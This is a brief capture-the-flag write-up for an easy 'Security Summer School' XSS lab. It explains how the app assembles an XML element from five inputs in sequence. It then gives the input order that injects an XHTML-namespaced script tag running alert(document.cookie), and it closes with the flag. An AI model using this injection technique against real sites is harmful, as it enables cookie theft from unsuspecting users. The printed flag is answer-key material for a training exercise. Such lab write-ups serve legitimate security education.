---
Name: "The GOD COMPLEX"
Category: "Security Summer School"
Difficulty: "Easy"
Description: "Investigating client-side behaviour and XSS techniques in the final lab challenge."
---

# The GOD COMPLEX
After sending multiple payloads we see that it creates the XML entry part by part
1 -> random value
2 -> element name
3 -> attribute name
4 -> attribute value
5 -> content

We have to send in sequence
```
1

xmlns:x

http://www.w3.org/1999/xhtml

alert(document.cookie)

x:script
```

flag
```txt
SSS{got_some_complex?}
```

